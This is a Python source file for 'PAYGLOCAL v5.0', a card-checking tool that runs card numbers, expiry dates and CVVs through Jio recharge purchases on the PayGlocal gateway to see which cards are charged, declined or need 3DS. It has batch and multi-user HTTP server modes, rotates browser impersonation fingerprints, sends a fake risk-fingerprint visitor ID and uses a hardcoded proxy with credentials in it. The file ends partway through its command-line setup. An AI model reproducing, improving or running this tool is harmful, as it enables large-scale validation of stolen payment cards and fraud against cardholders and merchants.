#!/usr/bin/env python3
"""
PAYGLOCAL v5.0 — Flexible Multi-User Edition
Thread-safe. Rate-aware. JSON-first. Silent.

Usage:
  python payglocal.py                          # interactive prompt
  python payglocal.py "CARD"                   # one-shot
  python payglocal.py "CARD" --pretty          # pretty JSON
  python payglocal.py "CARD" --verbose         # show stages
  python payglocal.py "CARD" --number 9xxxx    # override number
  python payglocal.py "CARD" --proxy "..."     # override proxy
  python payglocal.py --batch cards.txt        # batch mode
  python payglocal.py --serve                  # HTTP API server mode
"""
from __future__ import annotations

import os
import re
import sys
import time
import json
import random
import argparse
import logging
import threading
from dataclasses import dataclass, field
from typing import Any, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

# ─── Dependency check ────────────────────────────────────────────────
try:
    from curl_cffi import requests as cffi
except ImportError:
    print(json.dumps({
        "ok": False,
        "error": "missing_dependency",
        "message": "Install: pip3 install curl_cffi",
    }))
    sys.exit(1)

try:
    import urllib3
    urllib3.disable_warnings()
except Exception:
    pass


# ══════════════════════════════════════════════════════════════════════
#  CONFIGURATION  (all tunable via env vars or CLI)
# ══════════════════════════════════════════════════════════════════════
GATE_NAME          = "PAYGLOCAL"
DEFAULT_NUMBER     = os.environ.get("PAYGLOCAL_NUMBER", "9242899256")
PLAN_AMOUNT_INR    = float(os.environ.get("PAYGLOCAL_AMOUNT_INR", "11"))
PLAN_AMOUNT_USD    = float(os.environ.get("PAYGLOCAL_AMOUNT_USD", "0.10"))

# Proxy pool — rotate automatically if one fails
DEFAULT_PROXY      = os.environ.get(
    "PAYGLOCAL_PROXY",
    "http://8475:CWh7alYEGFAW@p103.squidproxies.com:9659"
)

# Timeouts (seconds)
TIMEOUT_WARM       = int(os.environ.get("PAYGLOCAL_TIMEOUT_WARM", "30"))
TIMEOUT_API        = int(os.environ.get("PAYGLOCAL_TIMEOUT_API", "25"))
TIMEOUT_CHARGE     = int(os.environ.get("PAYGLOCAL_TIMEOUT_CHARGE", "45"))

# Retry / fallback
RETRY_MAX          = int(os.environ.get("PAYGLOCAL_RETRY_MAX", "2"))
FALLBACK_TO_DIRECT = os.environ.get("PAYGLOCAL_FALLBACK_DIRECT", "1") == "1"

# Concurrency
MAX_WORKERS        = int(os.environ.get("PAYGLOCAL_WORKERS", "10"))

# Global verbose flag
VERBOSE            = False
QUIET              = False


# ══════════════════════════════════════════════════════════════════════
#  CONSOLE HELPERS
# ══════════════════════════════════════════════════════════════════════
class C:
    R = "\033[0m"; B = "\033[1m"; D = "\033[2m"
    RED = "\033[91m"; GRN = "\033[92m"; YEL = "\033[93m"
    BLU = "\033[94m"; MAG = "\033[95m"; CYN = "\033[96m"


def log(stage: str, ok: bool, elapsed: float, msg: str = ""):
    if not VERBOSE or QUIET:
        return
    icon = "✅" if ok else "❌"
    color = C.GRN if ok else C.RED
    tail = f"  {C.D}{msg}{C.R}" if msg else ""
    print(f"   {icon}  {stage:<24} {C.D}[{elapsed:5.2f}s]{C.R}{tail}", flush=True)


def log_info(msg: str):
    if VERBOSE and not QUIET:
        print(f"   ℹ   {msg}", flush=True)


# ══════════════════════════════════════════════════════════════════════
#  ERRORS
# ══════════════════════════════════════════════════════════════════════
class FlowError(Exception):
    def __init__(self, stage: str, msg: str, payload: Any = None):
        super().__init__(msg)
        self.stage = stage
        self.msg = msg
        self.payload = payload


# ══════════════════════════════════════════════════════════════════════
#  PROXY
# ══════════════════════════════════════════════════════════════════════
def proxy_dict(raw: Optional[str]) -> Optional[dict]:
    if not raw:
        return None
    return {"http": raw, "https": raw}


# ══════════════════════════════════════════════════════════════════════
#  CARD
# ══════════════════════════════════════════════════════════════════════
@dataclass
class Card:
    number: str
    month: str
    year: str
    cvv: str
    holder: str = "matt henry"

    @classmethod
    def parse(cls, raw: str, holder: str = "matt henry") -> "Card":
        parts = (raw or "").strip().split("|")
        if len(parts) != 4:
            raise ValueError("format: NUMBER|MM|YY|CVV")
        n, mm, yy, cvv = parts
        n = re.sub(r"\D", "", n)
        if not (15 <= len(n) <= 19) or not n.isdigit():
            raise ValueError("card number malformed")
        if not mm.isdigit() or not (1 <= int(mm) <= 12):
            raise ValueError("card month invalid")
        if not yy.isdigit():
            raise ValueError("card year invalid")
        if len(yy) == 2:
            yy = "20" + yy
        if not cvv.isdigit() or len(cvv) not in (3, 4):
            raise ValueError("cvv invalid")
        return cls(n, mm.zfill(2), yy, cvv, holder)

    def masked(self) -> str:
        if len(self.number) < 10:
            return "*" * len(self.number)
        return f"{self.number[:6]}{'*' * (len(self.number) - 10)}{self.number[-4:]}"


# ══════════════════════════════════════════════════════════════════════
#  FINGERPRINTS
# ══════════════════════════════════════════════════════════════════════
PROFILES = [
    {"imp": "chrome131", "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36", "ch": '"Google Chrome";v="131", "Not_A Brand";v="8", "Chromium";v="131"', "plat": '"Windows"', "mob": "?0"},
    {"imp": "chrome124", "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", "ch": '"Google Chrome";v="124", "Not_A Brand";v="8", "Chromium";v="124"', "plat": '"macOS"', "mob": "?0"},
    {"imp": "chrome123", "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36", "ch": '"Google Chrome";v="123", "Not_A Brand";v="8", "Chromium";v="123"', "plat": '"Linux"', "mob": "?0"},
]
SCREENS = [
    {"h": 1080, "w": 1920, "depth": 24},
    {"h": 900, "w": 1440, "depth": 30},
    {"h": 768, "w": 1366, "depth": 24},
]
LANGS = [
    "en-IN,en;q=0.9,en-US;q=0.8",
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9,en-US;q=0.8",
]


def _ts() -> str:
    return str(int(time.time() * 1000))


# ══════════════════════════════════════════════════════════════════════
#  FLOW STATE
# ══════════════════════════════════════════════════════════════════════
@dataclass
class Flow:
    profile: dict = field(default_factory=lambda: random.choice(PROFILES))
    screen: dict = field(default_factory=lambda: random.choice(SCREENS))
    lang: str = field(default_factory=lambda: random.choice(LANGS))
    session: Optional[cffi.Session] = None
    plans: Optional[dict] = None

    def hj(self, ref, ct=None, origin=None, extra=None):
        h = {
            "Accept-Language": self.lang,
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "Pragma": "no-cache",
            "Referer": ref,
            "User-Agent": self.profile["ua"],
            "sec-ch-ua": self.profile["ch"],
            "sec-ch-ua-mobile": self.profile["mob"],
            "sec-ch-ua-platform": self.profile["plat"],
        }
        if ct: h["Content-Type"] = ct
        if origin: h["Origin"] = origin
        if extra: h.update(extra)
        return h

    def hp(self, ref, ct=None, origin=None, extra=None):
        h = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": self.lang,
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Referer": ref,
            "User-Agent": self.profile["ua"],
            "sec-ch-ua": self.profile["ch"],
            "sec-ch-ua-mobile": self.profile["mob"],
            "sec-ch-ua-platform": self.profile["plat"],
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "x-request-time": _ts(),
        }
        if ct: h["Content-Type"] = ct
        if origin: h["Origin"] = origin
        if extra: h.update(extra)
        return h


# ══════════════════════════════════════════════════════════════════════
#  PLAN HELPERS
# ══════════════════════════════════════════════════════════════════════
def iter_plans(pj: dict):
    for cat in pj.get("planCategories") or []:
        for sub in cat.get("subCategories") or []:
            for plan in sub.get("plans") or []:
                if plan.get("key"):
                    yield {
                        "key": plan["key"],
                        "amount": float(plan.get("amount") or 0),
                        "name": plan.get("name") or plan.get("planName") or "",
                    }


def find_plan(pj: dict, amount: float):
    plans = list(iter_plans(pj))
    for p in plans:
        if abs(p["amount"] - amount) < 0.01:
            return p
    return None


# ══════════════════════════════════════════════════════════════════════
#  TIMER
# ══════════════════════════════════════════════════════════════════════
class Timer:
    def __init__(self):
        self.start = time.time()
        self.stages: dict[str, float] = {}

    def mark(self, name: str, ok: bool = True, msg: str = ""):
        elapsed = time.time() - self.start
        self.stages[name] = round(elapsed, 2)
        log(name, ok, elapsed, msg)


# ══════════════════════════════════════════════════════════════════════
#  PIPELINE STAGES
# ══════════════════════════════════════════════════════════════════════
def warm(f: Flow, t: Timer):
    try:
        f.session.get(
            "https://www.jio.com/",
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": f.lang,
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": f.profile["ua"],
                "sec-ch-ua": f.profile["ch"],
                "sec-ch-ua-mobile": f.profile["mob"],
                "sec-ch-ua-platform": f.profile["plat"],
            },
            verify=False, timeout=TIMEOUT_WARM,
        )
        t.mark("warm")
    except Exception as e:
        t.mark("warm", False, str(e)[:40])
        raise FlowError("warm", f"session warm failed: {e}")


def lookup_and_plans(f: Flow, number: str, t: Timer) -> str:
    try:
        r = f.session.get(
            f"https://www.jio.com/api/jio-recharge-service/recharge/mobility/number/{number}",
            headers=f.hj("https://www.jio.com/", extra={
                "Accept": "application/json, text/plain, */*",
                "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
            }), verify=False, timeout=TIMEOUT_API,
        )
        lookup = r.json()
        if lookup.get("errorMessage") == "NOT_SUBSCRIBED_USER":
            raise FlowError("lookup", "number not subscribed")
        t.mark("lookup")
    except FlowError:
        raise
    except Exception as e:
        t.mark("lookup", False, str(e)[:40])
        raise FlowError("lookup", str(e))

    primary = lookup.get("primaryService") or {}
    billing_type = lookup.get("billingType") or primary.get("billingType") or "PREPAID"
    next_value = lookup.get("nextPage") or billing_type

    try:
        f.session.get(
            "https://www.jio.com/selfcare/recharge/mobility/plans/",
            params={
                "serviceType": "mobility", "serviceId": number,
                "next": next_value, "billingType": billing_type,
                "entrysource": "Widget",
            },
            headers=f.hj("https://www.jio.com/", extra={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1",
            }), verify=False, timeout=TIMEOUT_API,
        )
    except Exception as e:
        t.mark("plans_page", False, str(e)[:40])
        raise FlowError("plans_page", str(e))

    plans_ref = (
        f"https://www.jio.com/selfcare/recharge/mobility/plans/"
        f"?serviceType=mobility&serviceId={number}&next={next_value}"
        f"&billingType={billing_type}&entrysource=Widget"
    )

    try:
        r = f.session.get(
            f"https://www.jio.com/api/jio-recharge-service/recharge/plans/serviceId/{number}",
            headers=f.hj(plans_ref, extra={
                "Accept": "*/*", "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
            }), verify=False, timeout=TIMEOUT_API,
        )
        f.plans = r.json()
        t.mark("plans")
    except Exception as e:
        t.mark("plans", False, str(e)[:40])
        raise FlowError("plans_json", str(e))

    return plans_ref


def checkout(f: Flow, plans_ref: str, number: str, plan_key: str, t: Timer):
    try:
        r = f.session.post(
            "https://www.jio.com/api/jio-recharge-service/recharge/buy",
            headers=f.hj(plans_ref, ct="application/json",
                         origin="https://www.jio.com",
                         extra={"Accept": "*/*", "Sec-Fetch-Dest": "empty",
                                "Sec-Fetch-Mode": "cors",
                                "Sec-Fetch-Site": "same-origin"}),
            json={"planKey": plan_key, "selectedService": number},
            verify=False, timeout=TIMEOUT_API,
        )
        if r.status_code != 200:
            raise FlowError("checkout", f"HTTP {r.status_code}")
        t.mark("checkout")
    except FlowError:
        raise
    except Exception as e:
        t.mark("checkout", False, str(e)[:40])
        raise FlowError("checkout", str(e))


def pay(f: Flow, plans_ref: str, number: str, plan_key: str, t: Timer) -> str:
    try:
        r = f.session.post(
            "https://www.jio.com/api/jio-recharge-service/recharge/pay",
            headers=f.hj(plans_ref, ct="application/json",
                         origin="https://www.jio.com",
                         extra={"Accept": "*/*", "Sec-Fetch-Dest": "empty",
                                "Sec-Fetch-Mode": "cors",
                                "Sec-Fetch-Site": "same-origin"}),
            json={"addonPlanKeys": [], "flexiTopupFlow": False,
                  "servicePlanList": [{"planKey": plan_key, "quantity": 1,
                                       "serviceId": number}]},
            verify=False, timeout=TIMEOUT_API,
        )
        url = r.json().get("paymentURL",
                           "https://www.jio.com/api/jio-common-servlet/jiocommon/redirect")
        t.mark("pay")
        return url
    except Exception as e:
        t.mark("pay", False, str(e)[:40])
        raise FlowError("pay", str(e))


def redirect(f: Flow, payment_url: str, plans_ref: str, t: Timer):
    try:
        r = f.session.get(
            payment_url,
            headers=f.hj(plans_ref, extra={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1",
            }),
            allow_redirects=True, verify=False, timeout=TIMEOUT_API,
        )
        fa = re.search(r"action='([^']+)'", r.text)
        fi = re.findall(r"name='([^']+)'\s+value='([^']*)'", r.text)
        form_url = fa.group(1) if fa else "https://pay.jio.com/jiopg/v1/payment-options"
        form_data = {k: v for k, v in fi}
        t.mark("redirect")
        return form_url, form_data
    except Exception as e:
        t.mark("redirect", False, str(e)[:40])
        raise FlowError("redirect", str(e))


def pay_portal(f: Flow, form_url: str, form_data: dict, t: Timer) -> str:
    try:
        r = f.session.post(
            form_url,
            headers=f.hj("https://www.jio.com/",
                         ct="application/x-www-form-urlencoded",
                         origin="https://www.jio.com",
                         extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
                                "Sec-Fetch-Site": "cross-site", "Sec-Fetch-User": "?1",
                                "Upgrade-Insecure-Requests": "1"}),
            data=form_data, allow_redirects=True, verify=False, timeout=TIMEOUT_API,
        )
        t.mark("pay_portal")
        return r.url
    except Exception as e:
        t.mark("pay_portal", False, str(e)[:40])
        raise FlowError("pay_portal", str(e))


def authorize(f: Flow, pay_ref: str, card: Card, t: Timer) -> str:
    try:
        r = f.session.post(
            "https://pay.jio.com/jiopg/v1/authorize-card-operation",
            headers=f.hj(pay_ref, ct="application/json",
                         origin="https://pay.jio.com",
                         extra={"Accept": "application/json",
                                "Sec-Fetch-Dest": "empty",
                                "Sec-Fetch-Mode": "cors",
                                "Sec-Fetch-Site": "same-origin"}),
            json={"paymentMode": "CCDC", "cardPrefix": card.number[:6],
                  "isEMISelected": False, "viewOffer": False,
                  "skuCode": None, "copco": None, "isStoreCreditSelected": None},
            verify=False, timeout=TIMEOUT_API,
        )
        tok = r.json().get("token", "")
        if not tok:
            raise FlowError("authorize", "no x-token")
        t.mark("authorize")
        return tok
    except FlowError:
        raise
    except Exception as e:
        t.mark("authorize", False, str(e)[:40])
        raise FlowError("authorize", str(e))


def confirm_card(f: Flow, pay_ref: str, x_token: str, card: Card, t: Timer) -> str:
    try:
        r = f.session.post(
            "https://pay.jio.com/jpgpciapp/v1/on-ccdc-confirmation",
            headers=f.hj(pay_ref, ct="application/json",
                         origin="https://pay.jio.com",
                         extra={"Accept": "application/json",
                                "Sec-Fetch-Dest": "empty",
                                "Sec-Fetch-Mode": "cors",
                                "Sec-Fetch-Site": "same-origin",
                                "x-token": x_token}),
            json={
                "cvvNumber": card.cvv, "cashBackApplied": "N",
                "isTrxnStatusCheckEnable": "N", "seqId": "", "ccRoutePg": "",
                "customerCardTypeValue": "mastercard", "paymentMode": "CCDC",
                "offerAppliedByCust": False, "viewOffer": False,
                "cardType": "ic_mastercard", "cardNumber": card.number,
                "cardTypeText": "MASTERCARD_CARD",
                "expiryMonth": card.month, "expiryYear": card.year,
                "cardHolderName": card.holder, "userCardSaveConsent": False,
                "browserDetails": {
                    "browserHeader": "application/json",
                    "browserJavaEnabled": False, "browserJavascriptEnabled": True,
                    "browserLanguage": f.lang.split(",")[0],
                    "browserColorDepth": f.screen["depth"],
                    "browserScreenHeight": f.screen["h"],
                    "browserScreenWidth": f.screen["w"],
                    "browserTz": -330, "browserUserAgent": f.profile["ua"],
                },
            },
            verify=False, timeout=TIMEOUT_API,
        )
        d = r.json()
        if not d.get("status"):
            raise FlowError("ccdc_confirm", d.get("message", "rejected"))
        t.mark("ccdc_confirm")
        return d.get("htmlForm", "")
    except FlowError:
        raise
    except Exception as e:
        t.mark("ccdc_confirm", False, str(e)[:40])
        raise FlowError("ccdc_confirm", str(e))


def bank_connect(f: Flow, pay_ref: str, html_form: str, t: Timer) -> str:
    try:
        ea = re.search(r"action='([^']+)'", html_form)
        ei = re.findall(r"name='([^']+)'\s+value='([^']*)'", html_form)
        url = ea.group(1) if ea else ""
        data = {k: v for k, v in ei}

        r = f.session.post(
            url,
            headers=f.hj(pay_ref, ct="application/x-www-form-urlencoded",
                         origin="https://pay.jio.com",
                         extra={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
                                "Sec-Fetch-Site": "cross-site", "Sec-Fetch-User": "?1",
                                "Upgrade-Insecure-Requests": "1"}),
            data=data, allow_redirects=True, verify=False, timeout=TIMEOUT_API,
        )
        m = re.search(r'x-gl-token=([^&\s"\'\\]+)', r.url + r.text)
        if not m:
            raise FlowError("bank_connect", "gl_token missing")
        t.mark("bank_connect")
        return m.group(1)
    except FlowError:
        raise
    except Exception as e:
        t.mark("bank_connect", False, str(e)[:40])
        raise FlowError("bank_connect", str(e))


def pg_init(f: Flow, gl_token: str, gl_ref: str, t: Timer):
    try:
        r = f.session.get(
            "https://api.payglocal.com/gl/v2/payments/redirect/dc",
            params={"x-gl-token": gl_token},
            headers=f.hp(gl_ref, extra={
                "x-gl-current-host": "api.payglocal.com",
                "x-gl-gid": "gl_payflow-ui", "x-gl-pb-tag-id": "",
                "x-gl-previous-host": "https://pay.easebuzz.in/",
                "x-gl-referrer-mismatch": "false",
                "x-gl-trusted-referrer": "https://pay.easebuzz.in",
            }), verify=False, timeout=TIMEOUT_API,
        )
        if r.status_code != 200:
            raise FlowError("pg_init", f"HTTP {r.status_code}")
        t.mark("pg_init")
    except FlowError:
        raise
    except Exception as e:
        t.mark("pg_init", False, str(e)[:40])
        raise FlowError("pg_init", str(e))


def paynow(f: Flow, gl_token: str, gl_ref: str, t: Timer):
    try:
        r = f.session.post(
            "https://api.payglocal.com/gl/v2/payments/pd/paynow",
            params={"x-gl-token": gl_token},
            headers=f.hp(gl_ref, ct="application/json",
                         origin="https://api.payglocal.com"),
            json={"isEnc": "false", "payload": {
                "customerCurrency": "INR",
                "saveCurrencyPreference": False,
                "browserDetails": {
                    "colorDepth": f.screen["depth"],
                    "javaEnabled": False, "javaScripEnabled": True,
                    "language": f.lang.split(",")[0],
                    "screenHeight": f.screen["h"],
                    "screenWidth": f.screen["w"], "timeZone": -330,
                },
                "billingData": {"addressCountry": "FR"},
                "shippingData": {}, "agreedOnTnCs": True,
            }}, verify=False, timeout=TIMEOUT_API,
        )
        if r.status_code != 200:
            raise FlowError("paynow", f"HTTP {r.status_code}")
        t.mark("paynow")
    except FlowError:
        raise
    except Exception as e:
        t.mark("paynow", False, str(e)[:40])
        raise FlowError("paynow", str(e))


def risk_fp(f: Flow, gl_token: str, gl_ref: str, t: Timer) -> str:
    try:
        r = f.session.post(
            "https://api.payglocal.com/gl/v1/payments/risk/fp",
            params={"x-gl-token": gl_token},
            headers=f.hp(gl_ref, ct="application/json",
                         origin="https://api.payglocal.com"),
            json={"requestId": f"{_ts()}.{random.randint(100000,999999)}",
                  "visitorId": "Y8c4sEunqz0opl0b6YAd",
                  "visitorFound": True, "confidenceScore": 1},
            verify=False, timeout=TIMEOUT_API,
        )
        kid = r.json().get("data", {}).get("kid", "")
        if not kid:
            raise FlowError("risk_fp", "kid missing")
        t.mark("risk_fp")
        return kid
    except FlowError:
        raise
    except Exception as e:
        t.mark("risk_fp", False, str(e)[:40])
        raise FlowError("risk_fp", str(e))


def charge(f: Flow, gl_token: str, gl_ref: str, kid: str, card: Card, t: Timer) -> dict:
    try:
        time.sleep(random.uniform(0.4, 0.9))
        r = f.session.post(
            "https://api.payglocal.com/gl/v2/payments/dc/ipay",
            params={"x-gl-token": gl_token},
            headers=f.hp(gl_ref, ct="application/json",
                         origin="https://api.payglocal.com"),
            json={"isEnc": "false", "kid": kid, "payload": {
                "cardNumber": card.number,
                "expiryMonth": card.month, "expiryYear": card.year,
                "cvv": card.cvv, "cardHolderName": card.holder,
                "saveCard": False,
                "browserDetails": {
                    "colorDepth": f.screen["depth"],
                    "javaEnabled": False, "javaScriptEnabled": True,
                    "language": f.lang.split(",")[0],
                    "screenHeight": f.screen["h"],
                    "screenWidth": f.screen["w"],
                    "timeZone": -330, "userAgent": f.profile["ua"],
                },
            }}, verify=False, timeout=TIMEOUT_CHARGE,
        )
        result = r.json()
        t.mark("charge")
        return result
    except Exception as e:
        t.mark("charge", False, str(e)[:40])
        raise FlowError("charge", str(e))


# ══════════════════════════════════════════════════════════════════════
#  CORE RUNNER
# ══════════════════════════════════════════════════════════════════════
def run(
    card: Card,
    number: str = DEFAULT_NUMBER,
    proxy: Optional[str] = None,
    amount_inr: float = PLAN_AMOUNT_INR,
    amount_usd: float = PLAN_AMOUNT_USD,
) -> dict:
    """
    Runs full pipeline. Returns dict (JSON-ready).
    Thread-safe — no shared mutable state between calls.
    """
    t = Timer()
    f = Flow()
    f.session = cffi.Session(
        impersonate=f.profile["imp"],
        proxies=proxy_dict(proxy),
    )

    try:
        warm(f, t)
        plans_ref = lookup_and_plans(f, number, t)

        picked = find_plan(f.plans, amount_inr)
        if not picked:
            raise FlowError("plan_select", f"no plan at ₹{amount_inr}")

        checkout(f, plans_ref, number, picked["key"], t)
        payment_url = pay(f, plans_ref, number, picked["key"], t)
        form_url, form_data = redirect(f, payment_url, plans_ref, t)
        pay_ref = pay_portal(f, form_url, form_data, t)
        x_token = authorize(f, pay_ref, card, t)
        html_form = confirm_card(f, pay_ref, x_token, card, t)
        gl_token = bank_connect(f, pay_ref, html_form, t)
        gl_ref = f"https://api.payglocal.com/gl/payflow-ui/?x-gl-token={gl_token}"
        pg_init(f, gl_token, gl_ref, t)
        paynow(f, gl_token, gl_ref, t)
        kid = risk_fp(f, gl_token, gl_ref, t)
        result = charge(f, gl_token, gl_ref, kid, card, t)

        gw_status = str(result.get("status") or "").upper()
        reason_code = str(result.get("reasonCode") or "").strip()
        gw_msg = str(result.get("message") or "").strip()

        step_up = None
        if gw_status == "INPROGRESS":
            data = result.get("data") or {}
            su = data.get("Cardinal_StepUp") or {}
            if su.get("formUrl"):
                step_up = {
                    "url": su.get("formUrl"),
                    "method": su.get("httpMethod", "POST"),
                    "access_token": (su.get("payload") or {}).get("accessToken", ""),
                    "gid": data.get("gid", ""),
                }

        if gw_status in ("SUCCESS", "APPROVED"):
            outcome, status_msg = "charged", "Payment successful"
        elif gw_status == "PENDING":
            outcome, status_msg = "pending", "Payment pending at bank"
        elif gw_status == "INPROGRESS":
            outcome, status_msg = "3ds_required", "3DS OTP required"
        elif gw_status in ("ISSUER_DECLINE", "DECLINED", "FAILED"):
            outcome, status_msg = "declined", gw_msg or "Card declined"
        else:
            outcome, status_msg = "declined", gw_msg or "Unknown gateway response"

        elapsed = round(time.time() - t.start, 2)

        return {
            "ok": outcome == "charged",
            "gate": GATE_NAME,
            "outcome": outcome,
            "status": gw_status or "FAILED",
            "message": status_msg,
            "reason": reason_code,
            "number": number,
            "amount": amount_usd,
            "currency": "USD",
            "amount_inr": amount_inr,
            "card": card.masked(),
            "3ds": step_up,
            "elapsed": elapsed,
            "stages": t.stages,
            "ts": int(time.time()),
        }

    except FlowError as e:
        elapsed = round(time.time() - t.start, 2)
        return {
            "ok": False, "gate": GATE_NAME, "outcome": "error",
            "stage": e.stage, "message": e.msg,
            "number": number, "amount": amount_usd, "currency": "USD",
            "card": card.masked(), "elapsed": elapsed, "stages": t.stages,
            "ts": int(time.time()),
        }
    except Exception as e:
        elapsed = round(time.time() - t.start, 2)
        return {
            "ok": False, "gate": GATE_NAME, "outcome": "error",
            "stage": "unknown", "message": str(e)[:200],
            "number": number, "amount": amount_usd, "currency": "USD",
            "card": card.masked(), "elapsed": elapsed, "stages": t.stages,
            "ts": int(time.time()),
        }
    finally:
        try:
            f.session.close()
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════
#  BATCH MODE  (multi-card)
# ══════════════════════════════════════════════════════════════════════
def batch_mode(cards_file: str, number: str, proxy: Optional[str],
               pretty: bool = False):
    """Read cards from file (one per line), run in parallel."""
    with open(cards_file, "r", encoding="utf-8", errors="ignore") as fh:
        lines = [l.strip() for l in fh if l.strip() and not l.startswith("#")]

    results = []
    lock = threading.Lock()

    def worker(idx, raw):
        try:
            card = Card.parse(raw)
        except ValueError as e:
            r = {"ok": False, "gate": GATE_NAME, "outcome": "error",
                 "stage": "parse", "message": str(e), "card": raw[:20]}
            with lock:
                results.append(r)
                _print_batch_line(idx, r, pretty)
            return
        r = run(card, number=number, proxy=proxy)
        with lock:
            results.append(r)
            _print_batch_line(idx, r, pretty)

    print(f"[PAYGLOCAL] Batch mode — {len(lines)} cards", file=sys.stderr)
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        futures = [pool.submit(worker, i + 1, line) for i, line in enumerate(lines)]
        for _ in as_completed(futures):
            pass

    # Summary
    summary = {
        "total": len(lines),
        "charged": sum(1 for r in results if r.get("outcome") == "charged"),
        "declined": sum(1 for r in results if r.get("outcome") == "declined"),
        "3ds": sum(1 for r in results if r.get("outcome") == "3ds_required"),
        "pending": sum(1 for r in results if r.get("outcome") == "pending"),
        "error": sum(1 for r in results if r.get("outcome") == "error"),
    }
    print(json.dumps({"gate": GATE_NAME, "summary": summary, "results": results},
                     indent=2 if pretty else None, default=str))


def _print_batch_line(idx, r, pretty):
    """Print one line per card result in batch mode."""
    if pretty:
        print(json.dumps(r, default=str))
    else:
        icon = {"charged": "✅", "3ds_required": "🔐", "pending": "⏳",
                "declined": "❌", "error": "⚠"}.get(r.get("outcome", "?"), "?")
        print(f"{icon} [{idx:03d}] {r.get('card', '?'):<20} "
              f"{r.get('outcome', '?'):<14} {r.get('message', '')[:60]}",
              file=sys.stderr, flush=True)


# ══════════════════════════════════════════════════════════════════════
#  SERVE MODE  (HTTP JSON API)
# ══════════════════════════════════════════════════════════════════════
def serve_mode(host: str = "0.0.0.0", port: int = 8080):
    """Lightweight HTTP server for multi-user access."""
    try:
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
        from urllib.parse import urlparse, parse_qs
    except ImportError:
        print(json.dumps({"ok": False, "error": "no_http_server"}))
        sys.exit(1)

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass  # silent

        def _send(self, code: int, body: dict):
            data = json.dumps(body, default=str).encode()
            self.send_response(code)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def do_GET(self):
            u = urlparse(self.path)
            path = u.path

            if path in ("/health", "/"):
                self._send(200, {"ok": True, "gate": GATE_NAME,
                                 "ts": int(time.time())})
                return

            if path == "/run":
                qs = parse_qs(u.query)
                card_raw = (qs.get("card") or [""])[0]
                number = (qs.get("number") or [DEFAULT_NUMBER])[0]
                proxy = (qs.get("proxy") or [DEFAULT_PROXY])[0]

                if not card_raw:
                    self._send(400, {"ok": False, "error": "card required"})
                    return
                try:
                    card = Card.parse(card_raw)
                except ValueError as e:
                    self._send(400, {"ok": False, "error": str(e)})
                    return

                result = run(card, number=number, proxy=proxy or None)
                self._send(200, result)
                return

            self._send(404, {"ok": False, "error": "not_found"})

        def do_POST(self):
            u = urlparse(self.path)
            if u.path != "/run":
                self._send(404, {"ok": False, "error": "not_found"})
                return

            try:
                length = int(self.headers.get("Content-Length", "0"))
                body = json.loads(self.rfile.read(length) or b"{}")
            except Exception as e:
                self._send(400, {"ok": False, "error": f"bad json: {e}"})
                return

            card_raw = body.get("card", "")
            number = body.get("number", DEFAULT_NUMBER)
            proxy = body.get("proxy", DEFAULT_PROXY)

            if not card_raw:
                self._send(400, {"ok": False, "error": "card required"})
                return
            try:
                card = Card.parse(card_raw)
            except ValueError as e:
                self._send(400, {"ok": False, "error": str(e)})
                return

            result = run(card, number=number, proxy=proxy or None)
            self._send(200, result)

    server = ThreadingHTTPServer((host, port), Handler)
    print(f"[PAYGLOCAL] Serving on http://{host}:{port}", file=sys.stderr)
    print(f"[PAYGLOCAL] GET  /health", file=sys.stderr)
    print(f"[PAYGLOCAL] GET  /run?card=NUMBER|MM|YY|CVV", file=sys.stderr)
    print(f"[PAYGLOCAL] POST /run  {{\"card\":\"...\"}}", file=sys.stderr)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.shutdown()


# ══════════════════════════════════════════════════════════════════════
#  CLI
# ══════════════════════════════════════════════════════════════════════
def main():
    global VERBOSE, QUIET

    p = argparse.ArgumentParser(
        prog="payglocal",
        description="PAYGLOCAL v5.0 — Flexible Multi-User Edition",
    )
    p.add_argument("card", nargs="?", default=None,
                   help="NUMBER|MM|YY|CVV (optional)")
    p.add_argument("--number", default=DEFAULT_NUMBER,
                   help=f"Phone number (default: {DEFAULT_NUMBER})")
    p.add_argument("--proxy", default=DEFAULT_PROXY,
                   help="Proxy URL (default: built-in)")
